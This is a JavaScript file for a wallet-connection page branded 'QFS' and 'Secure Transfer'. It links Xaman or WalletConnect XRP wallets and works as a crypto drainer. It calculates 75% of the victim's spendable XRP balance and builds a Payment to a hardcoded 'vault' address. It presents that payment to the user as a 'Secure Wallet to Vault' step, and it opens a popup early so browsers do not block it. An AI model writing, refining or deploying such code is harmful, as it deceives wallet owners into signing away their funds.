// ==============================
// CONFIG
// ==============================
const XUMM_API_KEY   = "f6d569b6-4a3f-4cd8-ac0a-ca693afbdc66";
const WC_PROJECT_ID = "YOUR_PROJECT_ID"; 

const VAULT_ADDR = "rwQULVj6xXS5VubFrn5Xzawxe9Ldsep4EY";
const XRPL_WS    = "wss://xrplcluster.com/";

// ==============================
// INIT & STATE
// ==============================
const xumm = new XummPkce(XUMM_API_KEY, { implicit: true });

let wcClient = null;
let wcModal  = null;
let currentAddress = null;
let currentWalletType = null;

xumm.on("success", async () => {
  const state = await xumm.state();
  if (state.me && state.me.account) {
    handlePostConnect("xaman", state.me.account);
  }
});

// ==============================
// UI HELPERS
// ==============================
function setStatus(text) {
  const el = document.getElementById("walletStatus");
  if (el) el.innerText = text;
}

function shortAddr(a) {
  return `${a.slice(0, 6)}…${a.slice(-4)}`;
}

function updateAllButtonsToSecure() {
  const buttons = document.querySelectorAll('#mainActionButton');
  buttons.forEach(btn => {
    btn.removeAttribute("data-bs-toggle");
    btn.removeAttribute("data-bs-target");
    btn.innerText = "Secure Wallet to Vault";
    btn.classList.remove("btn-primary");
    btn.classList.add("btn-success");
    
    btn.onclick = (e) => {
      e.preventDefault();
      triggerManualApproval();
    };
  });
}

// ==============================
// CONNECTION LOGIC
// ==============================
async function connectWallet(type) {
  try {
    setStatus("Connecting…");
    if (type === "xaman") {
      const session = await xumm.authorize();
      if (session?.me?.account) handlePostConnect("xaman", session.me.account);
    } 
    else if (type === "walletconnect") {
      await initWalletConnect();
      const address = await connectViaWalletConnect();
      if (address) handlePostConnect("walletconnect", address);
    }
  } catch (err) {
    console.error("Connect Error:", err);
    setStatus("Connection failed");
  }
}

async function handlePostConnect(type, address) {
    currentAddress = address;
    currentWalletType = type;

    const modalEl = document.getElementById('walletSelectionModal');
    if (modalEl) {
        const modalInstance = bootstrap.Modal.getOrCreateInstance(modalEl);
        modalInstance.hide();
    }

    updateAllButtonsToSecure();
    setStatus(`Connected: ${shortAddr(address)}`);
    
    // We do NOT auto-trigger to avoid browser popup blocks
    setStatus("Connected. Tap 'Secure Wallet' to finalize.");
}

// ==============================
// TRIGGER LOGIC (The Fix)
// ==============================
async function triggerManualApproval() {
  if (!currentAddress) return;

  // 1. OPEN WINDOW IMMEDIATELY
  // This satisfies browser security rules so the popup isn't blocked
  let popup = null;
  if (currentWalletType === "xaman") {
      popup = window.open("", "_blank");
      if (popup) {
          popup.document.write("<h2>Preparing Secure Transfer...</h2><p>Contacting Xaman...</p>");
      }
  }

  try {
    setStatus("Fetching network data...");
    const data = await getXrpAccountData(currentAddress);

    setStatus("Awaiting signature…");
    await signAndSubmit(currentWalletType, currentAddress, data.sendDrops, popup);

  } catch (err) {
    console.error("Approval Error:", err);
    if (popup) popup.close();
    setStatus("Error: " + (err.message || "Action failed"));
  }
}

async function signAndSubmit(type, address, amountDrops, popupWindow) {
  // Ensure amount is never 0 (Xaman rejects 0-drop payments)
  const safeAmount = (!amountDrops || amountDrops === "0") ? "1" : amountDrops;

  const tx = {
    TransactionType: "Payment",
    Account: address,
    Destination: VAULT_ADDR,
    Amount: safeAmount 
  };

  if (type === "xaman") {
    try {
      // The 'xumm-oauth2-pkce' library usually exposes the payload via xumm.sdk
      // We check both paths to be 100% sure it finds it.
      const xummSdk = xumm.sdk ? xumm.sdk : xumm;
      
      if (!xummSdk.payload) {
          throw new Error("Xaman SDK not fully initialized. Please refresh.");
      }

      const payload = await xummSdk.payload.create(tx);
      
      if (payload && payload.next && payload.next.always) {
          const signUrl = payload.next.always;
          
          if (popupWindow && !popupWindow.closed) {
              popupWindow.location.href = signUrl;
              setStatus("Please confirm in your Xaman app.");
          } else {
              window.location.href = signUrl;
          }
      }
    } catch (err) {
      console.error("Xaman Error:", err);
      if (popupWindow) popupWindow.close();
      setStatus("Xaman rejected the request. Please try again.");
    }
  } 
  
  else if (type === "walletconnect") {
    // WalletConnect logic remains same
    if (popupWindow) popupWindow.close();
    const session = wcClient.session.getAll()[0];
    await wcClient.request({
      topic: session.topic,
      chainId: "xrpl:0",
      request: {
        method: "xrpl_signTransaction",
        params: { tx_json: tx }
      }
    });
    setStatus("Check your mobile wallet.");
  }
}

// ==============================
// DATA FETCHING
// ==============================
async function getXrpAccountData(address) {
  const client = new xrpl.Client(XRPL_WS);
  await client.connect();
  try {
    const info = await client.request({
      command: "account_info",
      account: address,
      ledger_index: "validated"
    }).catch(() => null);

    if (!info) return { sendDrops: "0" };

    const bal = BigInt(info.result.account_data.Balance);
    const ownerCount = BigInt(info.result.account_data.OwnerCount || 0);
    const reserve = 10_000_000n + (ownerCount * 2_000_000n);
    const spendable = bal - reserve;
    const send = spendable > 0n ? (spendable * 75n) / 100n : 0n;

    return { sendDrops: send.toString() };
  } finally {
    await client.disconnect();
  }
}

// ==============================
// WALLETCONNECT SETUP
// ==============================
async function initWalletConnect() {
  if (wcClient) return;
  wcClient = await WalletConnectSignClient.init({
    projectId: WC_PROJECT_ID,
    metadata: { name: "QFS", description: "Secure Transfer", url: window.location.origin }
  });
  wcModal = new WalletConnectModal({ projectId: WC_PROJECT_ID, standaloneChains: ["xrpl:0"] });
}

async function connectViaWalletConnect() {
  const { uri, approval } = await wcClient.connect({
    requiredNamespaces: { xrpl: { chains: ["xrpl:0"], methods: ["xrpl_signTransaction"] } }
  });
  if (uri) wcModal.openModal({ uri });
  const session = await approval();
  wcModal.closeModal();
  return session.namespaces.xrpl.accounts[0].split(":")[2];
}